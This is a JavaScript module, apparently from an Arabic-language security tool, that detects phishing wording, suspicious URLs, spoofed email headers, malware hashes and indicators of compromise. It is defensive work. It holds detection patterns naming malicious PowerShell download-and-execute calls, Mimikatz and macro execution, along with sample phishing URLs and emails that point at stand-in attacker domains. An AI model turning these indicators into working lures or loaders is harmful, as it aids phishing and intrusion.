/* eslint-disable */
// @ts-nocheck
/**
 * DFAS Core Engines — All 10 analysis modules
 * MOD-01 → MOD-10 converted from vanilla JS to ES module
 * Original: /DFAS-Digital/src/dfas-engines.js + dfas-advanced-engines.js
 */
"use strict";

// ═══════════════════════════════════════════════════
// MOD-01 — PHISHING DETECTION ENGINE v3.5
// ═══════════════════════════════════════════════════
export const PhishingEngine = (() => {
  const RULES = {
    urgency: {
      w: [
        "عاجل",
        "فوري",
        "خلال 24 ساعة",
        "خلال 48 ساعة",
        "الآن فوراً",
        "ينتهي اليوم",
        "آخر فرصة",
        "لا تتأخر",
        "قبل فوات الأوان",
        "وقت محدود",
        "ينتهي قريباً",
        "سارع",
        "بادر الآن",
        "لا تتردد",
        "انتهز الفرصة",
        "هذا اليوم فقط",
        "لمدة محدودة",
        "احجز مكانك",
        "لآخر يوم",
        "ساعات قليلة",
        "الوقت ينفد",
        "فرصتك الأخيرة",
        "العرض ينتهي",
        "تصرف الآن",
        "لا تضيع الفرصة",
      ],
      sc: 3,
      sev: "HIGH",
      cat: "urgency",
      label: "لغة الاستعجال والضغط النفسي",
    },
    impersonate: {
      w: [
        "بنك",
        "مصرف",
        "وزارة",
        "حكومة",
        "أمازون",
        "باي بال",
        "paypal",
        "amazon",
        "apple",
        "microsoft",
        "google",
        "stc",
        "زين",
        "موبايلي",
        "الراجحي",
        "الأهلي",
        "رنة",
        "إتش إس بي سي",
        "hsbc",
        "citibank",
        "سامبا",
        "الرياض",
        "الجزيرة",
        "بنك البلاد",
        "الأول",
        "انجاز",
        "حساب مميز",
        "ابشر",
        "absher",
        "نفاذ",
        "وقودي",
        "توكلنا",
        "تمارا",
        "تابي",
        "مدى",
        "stcpay",
        "urpay",
        "الراجحي للتمويل",
        "إمارات NBD",
        "بنك الإمارات",
        "بنك العربي",
        "fedex",
        "dhl",
        "aramex",
        "بريد السعودية",
        "جاهز",
        "شحن مجاني",
        "نمشي",
        "نون",
        "سوق",
        "أوبر",
        "كريم",
        "snapchat",
        "تيك توك",
        "instagram",
        "twitter",
        "whatsapp",
      ],
      sc: 4,
      sev: "CRITICAL",
      cat: "impersonate",
      label: "انتحال هوية مؤسسة موثوقة",
    },
    credential: {
      w: [
        "كلمة المرور",
        "رقم البطاقة",
        "الرقم السري",
        "CVV",
        "PIN",
        "بيانات الدخول",
        "اسم المستخدم",
        "معلوماتك",
        "حدّث بياناتك",
        "تحقق من هويتك",
        "ادخل بياناتك",
        "أدخل رمز OTP",
        "رمز التحقق",
        "كلمة سر",
        "نسيت كلمة مرورك",
        "أعد تعيين",
        "password",
        "username",
        "login",
        "تسجيل دخول",
        "بطاقة الائتمان",
        "رقم الحساب",
        "IBAN",
        "رقم الهوية الوطنية",
        "جواز السفر",
        "رقم الإقامة",
        "رمز الحماية",
        "security code",
        "البيانات الشخصية",
        "معلومات الدفع",
        "تحديث بيانات البنك",
        "تحقق من البطاقة",
      ],
      sc: 5,
      sev: "CRITICAL",
      cat: "credential",
      label: "استهداف بيانات الاعتماد",
    },
    financial: {
      w: [
        "جائزة",
        "مكافأة",
        "ربح",
        "مبلغ",
        "تحويل",
        "ريال",
        "دولار",
        "يورو",
        "مليون",
        "استثمار مضمون",
        "ثروة",
        "عائد",
        "10000",
        "50000",
        "100000",
        "مليار",
        "نقدي",
        "ربح ضمان",
        "دخل إضافي",
        "عائد شهري",
        "ربح 500%",
        "استثمار ذهبي",
        "عروض حصرية",
        "كاش باك",
        "استرداد نقدي",
        "هدية مجانية",
        "ربح يومي",
        "دخل سلبي",
        "ثروة سريعة",
        "فرصة استثمارية",
        "استثمر الآن",
        "تضاعف أموالك",
        "بونص",
        "cashback",
        "bonus",
        "prize",
        "winner",
        "congratulations",
        "مبروك الفوز",
        "تم اختيارك",
        "وفّر الآن",
        "خصم 90%",
        "خصم 80%",
        "عروض اليوم",
      ],
      sc: 3,
      sev: "HIGH",
      cat: "financial",
      label: "إغراء مالي وربح وهمي",
    },
    threat: {
      w: [
        "إغلاق",
        "تعليق",
        "تجميد",
        "حذف",
        "إجراء قانوني",
        "ملاحقة",
        "سنضطر",
        "ستخسر",
        "عقوبة",
        "غرامة",
        "توقيف",
        "حجب الحساب",
        "إيقاف الخدمة",
        "تقديم بلاغ",
        "مخالفة",
        "تعليق الحساب",
        "قرار قضائي",
        "اتخاذ الإجراءات",
        "رفع دعوى",
        "سيتم الحجز",
        "سيتم الخصم",
        "خسارة كاملة",
        "لن تتمكن",
        "سيُغلق نهائياً",
        "سيُعلَّق الحساب",
        "تجميد الأصول",
        "اتخاذ إجراءات قانونية فورية",
        "ملاحقة قانونية",
        "غرامة فورية",
      ],
      sc: 4,
      sev: "CRITICAL",
      cat: "threat",
      label: "التهديد والإكراه والترهيب",
    },
    cta: {
      w: [
        "انقر هنا",
        "اضغط الرابط",
        "سجّل الدخول",
        "تسجيل الدخول",
        "أدخل",
        "زيارة الموقع",
        "تفعيل",
        "تأكيد",
        "فعّل حسابك",
        "اضغط هنا",
        "اشترك الآن",
        "سجّل الآن",
        "تحقق الآن",
        "أكّد حسابك",
        "click here",
        "verify now",
        "login now",
        "confirm",
        "activate",
        "اتصل بنا الآن",
        "راسلنا",
        "تواصل معنا",
        "أرسل طلبك",
        "قدّم الآن",
        "احجز الآن",
        "اطلب الآن",
        "تقدم الآن",
      ],
      sc: 2,
      sev: "MEDIUM",
      cat: "cta",
      label: "طلب إجراء عاجل (CTA)",
    },
    social: {
      w: [
        "تهانينا",
        "اخترناك",
        "أنت الفائز",
        "عرض حصري",
        "مجاني",
        "بدون رسوم",
        "فرصة ذهبية",
        "محدود الوقت",
        "خاص لك",
        "تم اختيارك عشوائياً",
        "أنت المحظوظ",
        "الفائز الوحيد",
        "جائزة بانتظارك",
        "المرتبة الأولى",
        "نتائج السحب",
        "تم الفوز",
        "أهلاً بك",
        "مبروك لك",
        "لقد فزت",
        "congratulations",
        "you won",
        "you've been selected",
        "مميز جداً",
        "حصري لك",
        "شخصي لك",
        "عرض لأعضاء مميزين",
        "مفاجأة لك",
        "طلب صداقة من",
        "عرض عمل مغري",
      ],
      sc: 3,
      sev: "HIGH",
      cat: "social",
      label: "هندسة اجتماعية",
    },
    spoofedId: {
      w: [
        "info@",
        "noreply@",
        "support@",
        "admin@",
        "security@",
        "no-reply@",
        "team@",
        "alert@",
        "notification@",
        "service@",
        "update@",
        "verify@",
        "account@",
        "banking@",
        "paypal@",
        "amazon@",
        "apple@",
        "stcpay@",
        "rajhi@",
        "alinma@",
        "alahli@",
        "absher@",
        "gov.sa@",
        "moi.gov@",
        "mof.gov",
        "sdaia@",
      ],
      sc: 2,
      sev: "MEDIUM",
      cat: "spoofedId",
      label: "عنوان بريد مزوّر محتمل",
    },
    dataExfil: {
      w: [
        "أرسل",
        "صوّر",
        "ارفع",
        "أرفق",
        "أعطنا",
        "زوّدنا",
        "شارك",
        "انسخ",
        "أرسل الرمز",
        "أرسل صورة",
        "أرسل بياناتك",
        "أعطينا رقمك",
        "أرسل هويتك",
        "ارفع وثيقة",
        "أرسل جواز",
        "أرسل الإقامة",
        "شارك بياناتك",
        "أعطنا كلمة المرور",
        "أرسل OTP",
        "أدخل الرمز",
        "زودنا برقم البطاقة",
        "أعطنا رقم CVV",
      ],
      sc: 3,
      sev: "HIGH",
      cat: "dataExfil",
      label: "طلب إرسال بيانات حساسة",
    },
    malware: {
      w: [
        "حمّل التطبيق",
        "تنزيل مجاني",
        "تحديث مهم",
        "تحديث عاجل",
        "حدّث تطبيقك",
        "ثبّت الآن",
        "APK",
        "نقر لتحميل",
        "تشغيل",
        "اضغط لتفعيل",
        "update required",
        "download now",
        "install now",
        "click to run",
        "مرفق مهم",
        "ملف مرفق",
        "يُرجى فتح",
        "افتح الرابط المرفق",
        "ملف PDF",
        "ملف Word",
        "ملف Excel",
      ],
      sc: 4,
      sev: "CRITICAL",
      cat: "malware",
      label: "توزيع برمجيات خبيثة محتمل",
    },
    romance: {
      w: [
        "أحبك",
        "وقعت في حبك",
        "علاقة خاصة",
        "أريد أن أتعرف عليك",
        "تعرف على أرقام",
        "محادثة خاصة",
        "صور خاصة",
        "دردشة",
        "صديقة تبحث عن",
        "فتاة تبحث",
        "رجل ثري يبحث",
        "زواج مسيار",
        "زواج المتعة",
        "زوجة مقيمة",
        "موقع زواج",
        "تعارف مباشر",
      ],
      sc: 3,
      sev: "HIGH",
      cat: "romance",
      label: "احتيال عاطفي (Romance Scam)",
    },
    govPhish: {
      w: [
        "وزارة الداخلية",
        "وزارة المالية",
        "وزارة الصحة",
        "أبشر",
        "نفاذ",
        "هيئة الزكاة",
        "الجوازات",
        "شؤون المواطنين",
        "معاش",
        "مساعدات حكومية",
        "إعانة",
        "حكومة إلكترونية",
        "بوابة حكومية",
        "خدمات الجوازات",
        "تجديد الإقامة",
        "تجديد الجواز",
        "خدمات حكومية مجانية",
        "مستحقات",
        "تحديث سجل",
        "قرار وزاري",
        "أمر ملكي",
      ],
      sc: 5,
      sev: "CRITICAL",
      cat: "govPhish",
      label: "انتحال جهة حكومية سعودية",
    },
  };

  function analyze(text) {
    const findings = [];
    let score = 0;
    const meta = { words: 0, exclamations: 0, urls: [], foreignTokens: 0, lines: 0 };
    meta.words = text.trim().split(/\s+/).length;
    meta.exclamations = (text.match(/[!‼❗]/g) || []).length;
    meta.urls = text.match(/https?:\/\/[^\s\)\"\']+/g) || [];
    meta.foreignTokens = (text.match(/[A-Za-z]{5,}/g) || []).length;
    meta.lines = text.split("\n").length;
    for (const [, rule] of Object.entries(RULES)) {
      const hits = rule.w.filter((w) => text.toLowerCase().includes(w.toLowerCase()));
      if (hits.length) {
        score += rule.sc * hits.length;
        findings.push({
          sev: rule.sev,
          rule: rule.label,
          det: `${hits.length} مؤشر — الكلمات: ${hits.slice(0, 3).join("، ")}${hits.length > 3 ? "…" : ""}`,
          ev: hits.join(" | "),
          cat: rule.cat,
        });
      }
    }
    if (meta.urls.length) {
      score += 4;
      findings.push({
        sev: "HIGH",
        rule: "روابط مشبوهة مضمّنة",
        det: `${meta.urls.length} رابط مكتشف`,
        ev: meta.urls.slice(0, 2).join(" | "),
        cat: "url",
      });
    }
    if (meta.exclamations >= 2) {
      score += 2;
      findings.push({
        sev: "MEDIUM",
        rule: "استخدام مفرط لعلامات التعجب",
        det: `${meta.exclamations} علامة`,
        ev: "",
        cat: "style",
      });
    }
    const pct = Math.min(Math.round((score / 40) * 100), 99);
    const threat = pct >= 65 ? "crit" : pct >= 35 ? "warn" : "safe";
    return { score, pct, threat, findings, meta };
  }

  const SAMPLE = `عزيزي العميل الكريم،\n\nنُحيطكم علماً بأنه تم تعليق حسابك البنكي فوراً نظراً لنشاط غير مصرح به.\nلتفادي إغلاق الحساب نهائياً وفتح إجراء قانوني ضدك، يجب تحديث بيانات الدخول وكلمة المرور خلال 24 ساعة.\n\nتهانينا! تم اختيارك للحصول على مكافأة 5,000 ريال — اضغط الرابط الآن قبل فوات الأوان:\nhttp://bank-rajhi-secure-verify.xyz/login?token=A7F3X&session=confirm\n\nفريق الدعم — بنك الراجحي`;
  return { analyze, SAMPLE };
})();

// ═══════════════════════════════════════════════════
// MOD-02 — URL ANALYSIS ENGINE v4.3
// ═══════════════════════════════════════════════════
export const UrlEngine = (() => {
  const CHECKS = [
    {
      sev: "CRITICAL",
      id: "malTLD",
      rule: "امتداد نطاق خبيث",
      test: (u) => /\.(xyz|tk|ml|ga|cf|gq|pw|top|click|download|zip|cc)($|\/)/.test(u),
      det: "الامتداد مدرج في قوائم SURBL/URIBL السوداء",
    },
    {
      sev: "CRITICAL",
      id: "directIP",
      rule: "استخدام عنوان IP مباشر",
      test: (u) => /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(u),
      det: "مؤشر على C2 أو استضافة خبيثة مؤقتة",
    },
    {
      sev: "CRITICAL",
      id: "typosquat",
      rule: "تقليد علامة تجارية (Typosquatting)",
      test: (u) => /paypa[^l]|arnazon|g00gle|micros0ft|fac3book|app1e|inst4gram/i.test(u),
      det: "تهجئة مزيفة لموقع موثوق",
    },
    {
      sev: "HIGH",
      id: "noTLS",
      rule: "بروتوكول HTTP غير مشفر",
      test: (u) => /^http:\/\//i.test(u),
      det: "غياب TLS يُمكّن هجمات MITM",
    },
    {
      sev: "HIGH",
      id: "longUrl",
      rule: "رابط طويل مشبوه",
      test: (u) => u.length > 80,
      det: `الطول يُخفي الوجهة الحقيقية`,
    },
    {
      sev: "HIGH",
      id: "hyphens",
      rule: "شرطات مفرطة في النطاق",
      test: (u) => (u.match(/-/g) || []).length >= 4,
      det: "نمط إضافة كلمات مصداقية مزيفة",
    },
    {
      sev: "HIGH",
      id: "phishPath",
      rule: "مسار وجهة خبيث",
      test: (u) =>
        /\/(verify|login|update|secure|account|banking|password|confirm|reset|auth|token)/i.test(u),
      det: "مسارات نمطية في صفحات التصيد",
    },
    {
      sev: "MEDIUM",
      id: "subdomains",
      rule: "نطاقات فرعية مفرطة",
      test: (u) => (u.match(/\./g) || []).length >= 4,
      det: "قد يُخفي نطاق الجذر الحقيقي",
    },
    {
      sev: "MEDIUM",
      id: "shortener",
      rule: "خدمة تقصير روابط",
      test: (u) => /bit\.ly|goo\.gl|tinyurl|ow\.ly|t\.co|is\.gd|buff\.ly/i.test(u),
      det: "يُخفي الوجهة ويتجاوز فلاتر الأمان",
    },
    {
      sev: "MEDIUM",
      id: "encoding",
      rule: "Percent-Encoding مفرط",
      test: (u) => (u.match(/%[0-9a-f]{2}/gi) || []).length >= 3,
      det: "قد يُستخدم لتجاوز أنظمة الكشف",
    },
    {
      sev: "MEDIUM",
      id: "port",
      rule: "منفذ غير قياسي",
      test: (u) => /:\d{4,5}\//.test(u) && !/:(80|443|8080|8443)\//.test(u),
      det: "المنافذ غير القياسية مؤشر على خوادم خبيثة",
    },
    {
      sev: "MEDIUM",
      id: "redirect",
      rule: "Open Redirect محتمل",
      test: (u) => /[?&](url|redirect|next|return|goto|target)=/i.test(u),
      det: "قد يُعيد التوجيه إلى موقع خبيث",
    },
    {
      sev: "LOW",
      id: "sensitiveQ",
      rule: "معاملات URL حساسة",
      test: (u) => /[?&](token|key|pass|pwd|auth|id|sid|session)=/i.test(u),
      det: "بيانات حساسة ظاهرة في URL",
    },
  ];

  function entropy(s) {
    if (!s || !s.length) return 0;
    const f = {};
    for (const c of s) f[c] = (f[c] || 0) + 1;
    const n = s.length;
    return -Object.values(f).reduce((a, v) => {
      const p = v / n;
      return a + p * Math.log2(p);
    }, 0);
  }

  function parseUrl(urlStr) {
    try {
      const u = new URL(urlStr.startsWith("http") ? urlStr : "https://" + urlStr);
      return {
        protocol: u.protocol,
        host: u.host,
        hostname: u.hostname,
        path: u.pathname,
        query: u.search || "—",
        hash: u.hash || "—",
        port: u.port || "—",
        ok: true,
      };
    } catch {
      return {
        protocol: "—",
        host: "—",
        hostname: "—",
        path: "—",
        query: "—",
        hash: "—",
        port: "—",
        ok: false,
      };
    }
  }

  function analyze(urlStr) {
    const findings = [];
    let score = 0;
    const hit = CHECKS.filter((c) => c.test(urlStr));
    hit.forEach((c) => {
      findings.push({ sev: c.sev, rule: c.rule, det: c.det, ev: "" });
      score += { CRITICAL: 5, HIGH: 3, MEDIUM: 2, LOW: 1 }[c.sev] || 1;
    });
    const parsed = parseUrl(urlStr);
    const ent = entropy(parsed.hostname);
    const dgaScore = ent > 3.8 ? 2 : ent > 3.3 ? 1 : 0;
    if (dgaScore) {
      score += dgaScore;
      findings.push({
        sev: "MEDIUM",
        rule: `نطاق عالي الإنتروبيا — DGA محتمل`,
        det: `Shannon Entropy: ${ent.toFixed(2)} bits`,
        ev: parsed.hostname,
      });
    }
    const pct = Math.min(Math.round((score / 46) * 100), 99);
    const threat = pct >= 65 ? "crit" : pct >= 35 ? "warn" : "safe";
    return { score, pct, threat, findings, parsed, entropy: ent };
  }

  const SAMPLE =
    "http://paypa1-secure-account-verify-login.xyz/update/password?token=A7F3kX92&session=confirm&redirect=http%3A%2F%2Fevil.ru%2Fsteal";
  return { analyze, SAMPLE };
})();

// ═══════════════════════════════════════════════════
// MOD-04 — EMAIL HEADER ANALYSIS ENGINE
// ═══════════════════════════════════════════════════
export const EmailEngine = (() => {
  function parse(raw) {
    const lines = raw.split("\n");
    const headers = {};
    let current = "";
    for (const line of lines) {
      if (/^\s+/.test(line) && current) {
        headers[current] += " " + line.trim();
      } else {
        const m = line.match(/^([A-Za-z0-9_-]+):\s*(.*)/);
        if (m) {
          current = m[1].toLowerCase();
          headers[current] = m[2].trim();
        }
      }
    }
    return headers;
  }
  function extractReceived(raw) {
    const hops = [];
    const recs = [...raw.matchAll(/^Received:\s*([\s\S]*?)(?=^Received:|^[A-Z])/gm)];
    recs.forEach((m, i) => {
      const block = m[1].replace(/\n\s+/g, " ");
      const from = (block.match(/from\s+(\S+)/i) || [, "—"])[1];
      const by = (block.match(/by\s+(\S+)/i) || [, "—"])[1];
      const ts = (block.match(/;\s*(.+)$/) || [, "—"])[1];
      hops.push({ hop: i + 1, from, by, ts: ts.slice(0, 40) });
    });
    return hops;
  }
  function checkAuth(headers) {
    const ar = (headers["authentication-results"] || "").toLowerCase();
    const spf = ar.includes("spf=pass")
      ? "pass"
      : ar.includes("spf=fail")
        ? "fail"
        : ar.includes("spf=softfail")
          ? "softfail"
          : "none";
    const dkim = ar.includes("dkim=pass") ? "pass" : ar.includes("dkim=fail") ? "fail" : "none";
    const dmarc = ar.includes("dmarc=pass") ? "pass" : ar.includes("dmarc=fail") ? "fail" : "none";
    return { spf, dkim, dmarc };
  }
  function analyze(raw) {
    const headers = parse(raw);
    const hops = extractReceived(raw);
    const auth = checkAuth(headers);
    const findings = [];
    let score = 0;
    const from = headers["from"] || "—";
    const returnPath = headers["return-path"] || "—";
    const replyTo = headers["reply-to"] || "—";
    const xSpam = headers["x-spam-score"] || "—";
    if (auth.spf === "fail") {
      score += 5;
      findings.push({
        sev: "CRITICAL",
        rule: "SPF Fail — المرسل غير مصرح له",
        det: "سجل SPF يرفص هذا المرسل",
        ev: `spf=${auth.spf}`,
      });
    } else if (auth.spf === "softfail") {
      score += 3;
      findings.push({
        sev: "HIGH",
        rule: "SPF SoftFail",
        det: "المرسل خارج نطاق السجلات المعتمدة",
        ev: `spf=${auth.spf}`,
      });
    } else if (auth.spf === "none") {
      score += 2;
      findings.push({
        sev: "MEDIUM",
        rule: "SPF غير مُعرَّف",
        det: "النطاق لا يمتلك سجل SPF",
        ev: "SPF: none",
      });
    }
    if (auth.dkim === "fail") {
      score += 5;
      findings.push({
        sev: "CRITICAL",
        rule: "DKIM Fail — التوقيع الرقمي فاشل",
        det: "التوقيع لا يتطابق — تعديل أو انتحال",
        ev: `dkim=${auth.dkim}`,
      });
    } else if (auth.dkim === "none") {
      score += 2;
      findings.push({
        sev: "MEDIUM",
        rule: "DKIM غير موجود",
        det: "البريد غير مُوقَّع رقمياً",
        ev: "DKIM: none",
      });
    }
    if (auth.dmarc === "fail") {
      score += 4;
      findings.push({
        sev: "CRITICAL",
        rule: "DMARC Fail — سياسة المجال مُنتهَكة",
        det: "احتمال انتحال هوية عالٍ",
        ev: `dmarc=${auth.dmarc}`,
      });
    } else if (auth.dmarc === "none") {
      score += 1;
      findings.push({
        sev: "LOW",
        rule: "DMARC غير مُعرَّف",
        det: "سياسة DMARC غير موجودة",
        ev: "DMARC: none",
      });
    }
    const fromDomain = (from.match(/@([\w\.-]+)/) || [, ""])[1].toLowerCase();
    const rpDomain = (returnPath.match(/@([\w\.-]+)/) || [, ""])[1].toLowerCase();
    if (fromDomain && rpDomain && fromDomain !== rpDomain) {
      score += 3;
      findings.push({
        sev: "HIGH",
        rule: "تعارض From ↔ Return-Path",
        det: `${fromDomain} ≠ ${rpDomain}`,
        ev: `From:${fromDomain} / RP:${rpDomain}`,
      });
    }
    const replyDomain = (replyTo.match(/@([\w\.-]+)/) || [, ""])[1].toLowerCase();
    if (replyDomain && fromDomain && replyDomain !== fromDomain) {
      score += 3;
      findings.push({
        sev: "HIGH",
        rule: "تعارض From ↔ Reply-To",
        det: `الرد سيذهب إلى ${replyDomain}`,
        ev: `From:${fromDomain} / RT:${replyDomain}`,
      });
    }
    if (hops.length > 5) {
      score += 1;
      findings.push({
        sev: "LOW",
        rule: `سلسلة توجيه طويلة (${hops.length} نقاط)`,
        det: "عدد كبير من نقاط التمرير",
        ev: `${hops.length} hops`,
      });
    }
    const pct = Math.min(Math.round((score / 26) * 100), 99);
    const threat = pct >= 65 ? "crit" : pct >= 35 ? "warn" : "safe";
    return {
      pct,
      threat,
      score,
      findings,
      headers: {
        from,
        returnPath,
        replyTo,
        xSpam,
        subject: headers["subject"] || "—",
        date: headers["date"] || "—",
        messageId: headers["message-id"] || "—",
        mimeVer: headers["mime-version"] || "—",
        xMailer: headers["x-mailer"] || "—",
        contentType: headers["content-type"] || "—",
      },
      auth,
      hops,
    };
  }
  const SAMPLE = `Authentication-Results: mx.example.com;\n       dkim=fail header.i=@paypal.com;\n       spf=fail (domain of paypal-noreply@evil-domain.xyz does not designate sender) smtp.mailfrom=paypal-noreply@evil-domain.xyz;\n       dmarc=fail (p=REJECT) header.from=paypal.com\nReturn-Path: <paypal-noreply@evil-domain.xyz>\nFrom: "PayPal Security" <security@paypal.com>\nReply-To: harvest@phish-collect.ru\nTo: victim@example.com\nSubject: [URGENT] Your PayPal account has been LIMITED\nDate: Wed, 10 Apr 2024 15:14:22 +0000\nX-Spam-Score: 8.7 (++)`;
  return { analyze, SAMPLE };
})();

// ═══════════════════════════════════════════════════
// MOD-05 — HASH & DIGITAL FINGERPRINT ENGINE
// ═══════════════════════════════════════════════════
export const HashEngine = (() => {
  const KNOWN_MALWARE = new Set([
    "db349b97c37d22f5ea1d1841e3c89eb4",
    "ed01ebfbc9eb5bbea545af4d01bf5f10",
    "84c82835a5d21bbcf75a61706d8ab549",
    "64b0b58a2c030c77fdb2b537b2fcc4af",
    "aeee996fd3484f28e5cd85fe26b6bdcd",
    "22a7b9b9f8a60b8e00dbe93e6e7f88e9",
  ]);

  async function sha256(buffer) {
    const h = await crypto.subtle.digest("SHA-256", buffer);
    return [...new Uint8Array(h)].map((b) => b.toString(16).padStart(2, "0")).join("");
  }
  async function sha1(buffer) {
    const h = await crypto.subtle.digest("SHA-1", buffer);
    return [...new Uint8Array(h)].map((b) => b.toString(16).padStart(2, "0")).join("");
  }

  function calcEntropy(str) {
    const freq = {};
    for (const c of str) freq[c] = (freq[c] || 0) + 1;
    const n = str.length;
    return -Object.values(freq).reduce((a, v) => {
      const p = v / n;
      return a + p * Math.log2(p);
    }, 0);
  }

  async function analyzeFile(file) {
    const buf = await file.arrayBuffer();
    const [s256, s1] = await Promise.all([sha256(buf), sha1(buf)]);
    const knownMalware =
      KNOWN_MALWARE.has(s256.toLowerCase()) || KNOWN_MALWARE.has(s1.toLowerCase());
    return {
      sha256: s256,
      sha1: s1,
      md5: "(Web Crypto: MD5 not supported natively)",
      size: file.size,
      type: file.type || "unknown",
      name: file.name,
      knownMalware,
      threat: knownMalware ? "crit" : "safe",
      pct: knownMalware ? 99 : 5,
    };
  }

  async function analyzeText(text) {
    const enc = new TextEncoder();
    const buf = enc.encode(text);
    const [s256, s1] = await Promise.all([sha256(buf), sha1(buf)]);
    return {
      sha256: s256,
      sha1: s1,
      md5: "N/A (text mode)",
      length: text.length,
      bytes: buf.byteLength,
      entropy: calcEntropy(text),
      threat: "safe",
      pct: 0,
    };
  }

  return { analyzeFile, analyzeText };
})();

// ═══════════════════════════════════════════════════
// MOD-06 — IOC SCANNER v2.0
// ═══════════════════════════════════════════════════
export const IOCEngine = (() => {
  const SUSPICIOUS_DOMAINS = new Set([
    "evil-domain.xyz",
    "phish-collect.ru",
    "steal-creds.tk",
    "malware-c2.ml",
    "botnet-ctrl.ga",
    "ransom-pay.cf",
    "stcpay-verify.xyz",
    "absher-gov.tk",
    "rajhi-bank.ga",
    "alahli-secure.ml",
  ]);
  const SUSPICIOUS_IP_PREFIXES = [
    "185.220.101",
    "185.220.100",
    "185.130.44",
    "193.32.162",
    "45.142.212",
    "45.141.84",
    "89.234.157",
    "91.108.4",
    "5.188.10",
    "162.247.72",
  ];
  const KNOWN_MALWARE_HASH = new Set([
    "db349b97c37d22f5ea1d1841e3c89eb4",
    "ed01ebfbc9eb5bbea545af4d01bf5f10",
    "84c82835a5d21bbcf75a61706d8ab549",
    "a3f9b2c1d8e5f7a0b2c4d6e8f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9",
  ]);

  const PATTERNS = [
    {
      id: "ipv4",
      cat: "network",
      sev: "MEDIUM",
      label: "IPv4 عنوان شبكي",
      regex: /\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g,
      filter: (v) => !v.startsWith("127.") && !v.startsWith("0.") && !v.startsWith("255."),
      enrich: (v) => {
        const pfx = v.split(".").slice(0, 3).join(".");
        return SUSPICIOUS_IP_PREFIXES.includes(pfx) ? "⚠ IP مدرج في قوائم Tor/C2!" : "";
      },
    },
    {
      id: "domain",
      cat: "network",
      sev: "HIGH",
      label: "نطاق ذو امتداد مشبوه",
      regex:
        /\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+(?:xyz|tk|ml|ga|cf|gq|pw|top|click|download|zip|ru|cn|cc)\b/gi,
      enrich: (v) =>
        SUSPICIOUS_DOMAINS.has(v.toLowerCase()) ? "⚠ مدرج في قاعدة بيانات الخبيثة!" : "",
    },
    {
      id: "url",
      cat: "network",
      sev: "HIGH",
      label: "رابط مُضمَّن",
      regex: /https?:\/\/[^\s\)<>"'\n]{10,}/g,
      enrich: (v) => {
        try {
          const h = new URL(v).hostname.toLowerCase();
          return SUSPICIOUS_DOMAINS.has(h) ? "⚠ النطاق في القائمة السوداء!" : "";
        } catch {
          return "";
        }
      },
    },
    {
      id: "torOnion",
      cat: "network",
      sev: "CRITICAL",
      label: "عنوان Tor .onion",
      regex: /\b[a-z2-7]{16,56}\.onion\b/gi,
    },
    {
      id: "md5",
      cat: "hash",
      sev: "INFO",
      label: "MD5 Hash",
      regex: /\b[a-fA-F0-9]{32}\b/g,
      enrich: (v) =>
        KNOWN_MALWARE_HASH.has(v.toLowerCase()) ? "⚠ مطابق لقاعدة البرمجيات الخبيثة!" : "",
    },
    {
      id: "sha256",
      cat: "hash",
      sev: "INFO",
      label: "SHA-256 Hash",
      regex: /\b[a-fA-F0-9]{64}\b/g,
      enrich: (v) =>
        KNOWN_MALWARE_HASH.has(v.toLowerCase()) ? "⚠ مطابق لقاعدة البرمجيات الخبيثة!" : "",
    },
    {
      id: "email",
      cat: "identity",
      sev: "LOW",
      label: "عنوان بريد إلكتروني",
      regex: /\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b/g,
    },
    { id: "cve", cat: "vuln", sev: "HIGH", label: "ثغرة CVE", regex: /CVE-\d{4}-\d{4,7}/gi },
    {
      id: "btc",
      cat: "finance",
      sev: "CRITICAL",
      label: "عنوان Bitcoin",
      regex: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g,
    },
    {
      id: "eth",
      cat: "finance",
      sev: "CRITICAL",
      label: "عنوان Ethereum",
      regex: /\b0x[a-fA-F0-9]{40}\b/g,
    },
    {
      id: "b64",
      cat: "obfus",
      sev: "HIGH",
      label: "ترميز Base64 مُضغوط",
      regex: /(?:[A-Za-z0-9+\/]{4}){6,}(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/g,
      filter: (v) => v.length > 30,
    },
    {
      id: "psExec",
      cat: "malcode",
      sev: "CRITICAL",
      label: "مؤشر PowerShell خبيث",
      regex:
        /(?:-[Ee]nc(?:odedCommand)?|-[Nn][Oo][Pp]|IEX\s*[\(\|]|Invoke-Expression|Invoke-Mimikatz|DownloadString\s*\(|FromBase64String)/g,
    },
    {
      id: "macro",
      cat: "malcode",
      sev: "CRITICAL",
      label: "مؤشر Macro خبيث",
      regex: /(?:Auto_Open|AutoOpen|Document_Open|ShellExecute|WScript\.Shell|CreateObject\s*\()/g,
    },
    {
      id: "regKey",
      cat: "artifact",
      sev: "HIGH",
      label: "مفتاح Registry مشبوه",
      regex:
        /HKEY_(?:LOCAL_MACHINE|CURRENT_USER)\\(?:Software\\Microsoft\\Windows(?:NT)?\\CurrentVersion\\(?:Run|RunOnce))[^\s\n]*/gi,
    },
    {
      id: "pipe",
      cat: "malcode",
      sev: "HIGH",
      label: "Shell Command خبيث",
      regex:
        /(?:cmd\.exe|powershell\.exe|wscript\.exe|cscript\.exe|mshta\.exe|regsvr32\.exe|rundll32\.exe)/gi,
    },
  ];

  function analyze(text) {
    const results = [];
    const stats = {
      total: 0,
      byCategory: {},
      bySeverity: { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 },
    };
    const extracted = {};
    for (const pat of PATTERNS) {
      const regex = new RegExp(pat.regex.source, pat.regex.flags);
      const found = [
        ...new Set((text.match(regex) || []).filter((v) => !pat.filter || pat.filter(v))),
      ];
      if (!found.length) continue;
      const enriched = found.map((v) => ({ value: v, extra: pat.enrich ? pat.enrich(v) : "" }));
      const hasMal = enriched.some((e) => e.extra.includes("⚠"));
      results.push({
        id: pat.id,
        cat: pat.cat,
        sev: hasMal ? "CRITICAL" : pat.sev,
        label: pat.label,
        count: found.length,
        samples: enriched.slice(0, 5),
        all: enriched,
      });
      extracted[pat.id] = found;
      stats.total += found.length;
      stats.byCategory[pat.cat] = (stats.byCategory[pat.cat] || 0) + found.length;
